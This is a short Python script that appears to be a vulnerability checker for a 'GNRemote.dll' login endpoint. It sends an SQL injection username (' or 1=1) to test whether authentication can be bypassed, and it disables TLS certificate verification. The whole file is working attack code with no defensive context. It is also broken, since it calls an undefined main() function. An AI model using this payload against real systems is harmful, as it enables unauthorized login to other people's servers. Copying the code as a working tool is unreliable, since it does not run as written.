import requests,re,urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url2=baseurl+'GNRemote.dll?GNFunction=LoginServer&decorator=text_wrap&frombrowser=esl'
	headers={
	"Content-Type": "application/x-www-form-urlencoded"
	}
	body1='username=admin&password=%018d8cbc8bfc24f018&ClientStatus=1'
	body2='username=%22\'%20or%201%3d1%3b%22&password=%018d8cbc8bfc24f018&ClientStatus=1'
	r=requests.post(url2,body1,headers=headers,timeout=5,verify=False)
	if '{"RetCode":2}' in r.text:
		r1=True
	else:
		r1=False
	r=requests.post(url2,body2,headers=headers,timeout=5,verify=False)
	if '{"RetCode":0}' in r.text:
		r2=True
	else:
		r2=False
	if r1 and r2:
		return True
	else:
		return False
if __name__ == '__main__':
	main()